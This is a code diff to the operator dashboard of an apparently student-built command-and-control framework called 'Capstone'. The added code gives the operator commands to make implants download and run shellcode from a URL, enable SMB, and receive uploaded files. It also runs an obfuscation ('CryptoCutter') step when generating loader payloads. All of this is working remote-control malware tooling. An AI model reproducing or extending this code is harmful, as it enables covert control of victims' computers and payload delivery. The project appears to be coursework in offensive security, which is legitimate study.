@@ -22,13 +22,14 @@ namespace CapstoneInterface
         private System.Threading.Timer _messageFetchTimer;
         private System.Threading.Timer _configFetchTimer;
         private System.Threading.Timer _fetchAlerts;
+        private System.Threading.Timer _fetchJSONOutput;
         private static HttpClient _httpClient = new HttpClient();
 
         public string host { get; set; }
         public string port { get; set; }
 
         public string operatorName { get; set; }
-        public string userToControl { get; set; }
+        public static string userToControl { get; set; }
 
         public string templatePayload = File.ReadAllText("C:\\Users\\vquer\\Documents\\Capstone\\Implementation\\Implant\\Implant.cs");
         public string menu = File.ReadAllText("C:\\Users\\vquer\\Documents\\Capstone\\Implementation\\CapstoneInterface\\menu.txt");
@@ -107,6 +108,7 @@ namespace CapstoneInterface
             _messageFetchTimer = new System.Threading.Timer(async _ => await FetchMessagesAsync(), null, TimeSpan.Zero, TimeSpan.FromSeconds(2));
             _configFetchTimer = new System.Threading.Timer(async _ => await displayImplantConfig(), null, TimeSpan.Zero, TimeSpan.FromSeconds(7));
             _fetchAlerts = new System.Threading.Timer(async _ => await FetchAlertsAsync(), null, TimeSpan.Zero, TimeSpan.FromSeconds(3));
+            _fetchJSONOutput = new System.Threading.Timer(async _ => await fetchJSONOutput(), null, TimeSpan.Zero, TimeSpan.FromSeconds(5));
         }
 
         private async void Dashboard_Load(object sender, EventArgs e)
@@ -216,6 +218,8 @@ namespace CapstoneInterface
 
         private void btnRunCommand_Click(object sender, EventArgs e)
         {
+            string dateTimeFormatted = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss");
+
             foreach (DataGridViewRow row in dataGridView1.Rows)
             {
                 bool isChecked = Convert.ToBoolean(row.Cells["Check"].Value);
@@ -242,7 +246,7 @@ namespace CapstoneInterface
                     // Join the remaining parts (if any) into a single string for 'args'
                     string command = result.Length > 1 ? string.Join(" ", result.Skip(1)) : "";
 
-                    string userCommand = @" (04/25)> " + operatorName + " sent " + command + " to '" + userToControl + "'";
+                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + command + " to '" + userToControl + "'";
 
                     txtConsoleOutput.AppendText("\r\n\r\n");
                     // Append the user command to the console output
@@ -266,10 +270,8 @@ namespace CapstoneInterface
 
                     string instruction = result[0];
                     string name = result[1];
-                    instruction = instruction.TrimEnd();
-                    name = name.TrimStart();
 
-                    String userCommand = @" (04/25)> " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
+                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
 
                     txtConsoleOutput.AppendText("\r\n\r\n");
                     // Append the user command to the console output
@@ -287,6 +289,59 @@ namespace CapstoneInterface
                     sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                 }
 
+                else if (input.Contains("enable_smb_client"))
+                {
+                    string[] result = input.Split(' ');
+
+                    string instruction = result[0];
+                    string computername = result[1];
+
+                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
+
+                    txtConsoleOutput.AppendText("\r\n\r\n");
+                    // Append the user command to the console output
+                    txtConsoleOutput.AppendText(userCommand + "\r\n");
+
+                    commandForImplant.Input = instruction;
+                    commandForImplant.ImplantUser = userToControl;
+                    commandForImplant.Args = computername;
+                    commandForImplant.Operator = operatorName;
+                    commandForImplant.timeToExec = "0";
+                    commandForImplant.delay = "0";
+                    commandForImplant.File = "";
+
+                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
+
+                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
+                }
+
+                else if (input.Contains("load_shellcode"))
+                {
+                    string[] result = input.Split(' ');
+
+                    string instruction = result[0];
+                    string url = result[1];
+                    instruction = instruction.TrimEnd();
+                    url = url.TrimStart();
+
+                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
+
+                    txtConsoleOutput.AppendText("\r\n\r\n");
+                    // Append the user command to the console output
+                    txtConsoleOutput.AppendText(userCommand + "\r\n");
+
+                    commandForImplant.Input = instruction;
+                    commandForImplant.ImplantUser = userToControl;
+                    commandForImplant.Operator = operatorName;
+                    commandForImplant.timeToExec = "0";
+                    commandForImplant.delay = "0";
+                    commandForImplant.File = url;
+
+                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
+
+                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
+                }
+
                 else if (input.Contains("loadcs"))
                 {
                     string[] result = input.Split(' ');
@@ -294,7 +349,7 @@ namespace CapstoneInterface
                     string instruction = result[0];
                     string cs = result[1];
 
-                    String userCommand = @" (04/25)> " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
+                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
 
                     txtConsoleOutput.AppendText("\r\n\r\n");
                     // Append the user command to the console output
@@ -312,6 +367,35 @@ namespace CapstoneInterface
                     sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                 }
 
+                else if (input.Contains("upload"))
+                {
+                    string filename = Path.GetFileName(lblFileToUploadPath.Text);
+                    //string dir = Path.GetDirectoryName(lblFileToUploadPath.Text);
+
+                    commandForImplant.Input = "upload"; // Keep as is
+                    commandForImplant.command = "."; // Renamed from 'command' to 'Command'
+                    commandForImplant.Args = filename; // New property, set as needed
+                    commandForImplant.ImplantUser = userToControl; // Keep as is
+                    commandForImplant.Operator = operatorName; // Keep as is
+                    commandForImplant.timeToExec = "0"; // Renamed from 'timeToExec' to 'TimeToExec'
+                    commandForImplant.delay = "0"; // Renamed from 'delay' to 'Delay'
+
+                    byte[] fileBytes = File.ReadAllBytes(lblFileToUploadPath.Text);
+                    string base64File = Convert.ToBase64String(fileBytes);
+                    commandForImplant.File = base64File;
+
+                    commandForImplant.UseSmb = "false"; // New property, set as needed or default
+
+                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + commandForImplant.Input + " to '" + userToControl + "'";
+
+                    txtConsoleOutput.AppendText("\r\n\r\n");
+                    txtConsoleOutput.AppendText(userCommand + "\r\n");
+
+                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
+
+                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
+                }
+
                 else if (input.Contains("cd"))
                 {
                     string[] result = input.Split(' ');
@@ -319,7 +403,7 @@ namespace CapstoneInterface
                     string instruction = result[0];
                     string path = result[1];
 
-                    String userCommand = @" (04/25)> " + operatorName + " sent " + instruction + " to '" + userToControl + "'";
+                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction + " to '" + userToControl + "'";
 
                     txtConsoleOutput.AppendText("\r\n\r\n");
                     // Append the user command to the console output
@@ -342,7 +426,7 @@ namespace CapstoneInterface
                 {
                     string instruction = input;
 
-                    String userCommand = @" (04/25)> " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
+                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction + " to '" + userToControl + "'";
 
                     txtConsoleOutput.AppendText("\r\n\r\n");
                     // Append the user command to the console output
@@ -366,11 +450,15 @@ namespace CapstoneInterface
         {
             HttpClient client = new HttpClient();
             var content = new StringContent(jsonCommand, Encoding.UTF8, "application/json");
-            var response = await client.PostAsync("http://" + host + ":8082/postCommand", content);
+            await client.PostAsync("http://" + host + ":8082/postCommand", content);
+        }
 
+        public async Task fetchJSONOutput()
+        {
             // Wait for 10 seconds
             await Task.Delay(10000);
 
+            HttpClient client = new HttpClient();
             // Fetch output from the /fetchOutput endpoint
             HttpResponseMessage outputResponse = await client.GetAsync("http://" + host + ":" + port + "/getOutput");
 
@@ -378,6 +466,11 @@ namespace CapstoneInterface
             {
                 // Fetch output as base64 string
                 string outputBase64 = await outputResponse.Content.ReadAsStringAsync();
+
+                if (string.IsNullOrEmpty(outputBase64))
+                {
+                    return;
+                }
 
                 // Base64 decode the string to get byte array
                 byte[] outputBytes = Convert.FromBase64String(outputBase64);
@@ -400,7 +493,7 @@ namespace CapstoneInterface
                 byte[] outputContentBytes = Convert.FromBase64String(outputContentBase64);
                 string outputContent = Encoding.UTF8.GetString(outputContentBytes);
 
-                txtConsoleOutput.AppendText("\r\n\r\n" + "Receiving " + outputContent.Length + " bytes from " + user);
+                txtConsoleOutput.AppendText("\r\n\r\n" + "Receiving " + outputContent.Length + " bytes from " + outputObj.ImplantUser);
                 await Task.Delay(2000);
                 txtConsoleOutput.AppendText("\r\n\r\n" + outputContent);
             }
@@ -737,7 +830,7 @@ Invoke-Run
                     //MessageBox.Show($"Error: {response.StatusCode}");
                 }
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                 //MessageBox.Show($"An error occurred: {ex.Message}");
             }
@@ -780,7 +873,7 @@ Invoke-Run
                 // Revert the changes to maintain original state
                 WriteFileContents(implantFilePath, originalImplantContents, "Revert Implant.cs changes");
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                 //MessageBox.Show($"An error occurred: {ex.Message}");
             }
@@ -866,7 +959,43 @@ Invoke-Run
                     // Append command details for reference
                     /*txtPayloadGen.AppendText($"Executed Filename: {fileName}\n" + Environment.NewLine);*/
                 }
-                catch (Exception ex)
+                catch (Exception)
+                {
+                    /*txtPayloadGen.AppendText($"An exception occurred while executing the command: {ex.Message}\n" + Environment.NewLine);*/
+                }
+            }
+        }
+
+        private void ExecuteCommandCryptoCutter(string fileName, string arguments)
+        {
+            using (var process = new Process())
+            {
+                process.StartInfo.FileName = fileName;
+                process.StartInfo.Arguments = arguments;
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+
+                try
+                {
+                    process.Start();
+                    process.WaitForExit();
+
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+
+                    // Append both standard output and error to the text box
+                    txtPayloadGen.AppendText($"Command Output: {output}\n" + Environment.NewLine);
+                    if (!string.IsNullOrEmpty(error))
+                    {
+                        /*txtPayloadGen.AppendText($"An error occurred: {error}\n" + Environment.NewLine);*/
+                    }
+
+                    // Append command details for reference
+                    /*txtPayloadGen.AppendText($"Executed Filename: {fileName}\n" + Environment.NewLine);*/
+                }
+                catch (Exception)
                 {
                     /*txtPayloadGen.AppendText($"An exception occurred while executing the command: {ex.Message}\n" + Environment.NewLine);*/
                 }
@@ -882,7 +1011,7 @@ Invoke-Run
             string arguments = $"\"{pythonScriptPath}\" -f \"{inputFilePath}\" -o \"{outputFilePath}\"";
             //txtPayloadGen.AppendText($"{arguments}" + Environment.NewLine);
 
-            ExecuteCommand("python", arguments);
+            ExecuteCommandCryptoCutter("python", arguments);
 
         }
 
@@ -923,7 +1052,7 @@ Invoke-Run
                         File.Copy(loaderExePath, saveFileDialog.FileName, true);
                         MessageBox.Show($"Loader.exe has been saved to: {saveFileDialog.FileName}");
                     }
-                    catch (Exception ex)
+                    catch (Exception)
                     {
                         /*txtPayloadGen.AppendText($"An error occurred: {ex.Message}" + Environment.NewLine);*/
                     }
@@ -1051,7 +1180,7 @@ Invoke-Run
                         //MessageBox.Show("HTTP Response Error!");
                     }
                 }
-                catch (Exception exception)
+                catch (Exception)
                 {
                     //Exception error
                     //MessageBox.Show($"Error: {exception.Message}");
@@ -1096,7 +1225,7 @@ Invoke-Run
                         //MessageBox.Show($"Request failed with status code: {response.StatusCode}");
                     }
                 }
-                catch (HttpRequestException httpRequestException)
+                catch (HttpRequestException)
                 {
                     // Handle any exceptions that occurred during the request
                     //MessageBox.Show($"Error making request: {httpRequestException.Message}");
@@ -1251,19 +1380,20 @@ Invoke-Run
 
         private void btnUploadFile_Click(object sender, EventArgs e)
         {
-            string filepath = lblFileToUploadPath.Text;
+            /*string filename = Path.GetFileName(lblFileToUploadPath.Text);
+            string dir = Path.GetDirectoryName(lblFileToUploadPath.Text);
 
             Command commandForImplant = new Command();
 
-            commandForImplant.Input = ""; // Keep as is
-            commandForImplant.command = "upload"; // Renamed from 'command' to 'Command'
-            commandForImplant.Args = ""; // New property, set as needed
+            commandForImplant.Input = "upload"; // Keep as is
+            commandForImplant.command = "."; // Renamed from 'command' to 'Command'
+            commandForImplant.Args = filename; // New property, set as needed
             commandForImplant.ImplantUser = userToControl; // Keep as is
             commandForImplant.Operator = operatorName; // Keep as is
             commandForImplant.timeToExec = "0"; // Renamed from 'timeToExec' to 'TimeToExec'
             commandForImplant.delay = "0"; // Renamed from 'delay' to 'Delay'
             
-            byte[] fileBytes = File.ReadAllBytes(filepath);
+            byte[] fileBytes = File.ReadAllBytes(lblFileToUploadPath.Text);
             string base64File = Convert.ToBase64String(fileBytes);
             commandForImplant.File = base64File;
 
@@ -1271,9 +1401,9 @@ Invoke-Run
 
             dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
 
-/*            richTextBox1.Text = "";
-            richTextBox1.Text = jsonCommand;*/
-            sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
+            richTextBox1.Text = "";
+            richTextBox1.Text = jsonCommand;
+            sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);*/
         }
     }
 }
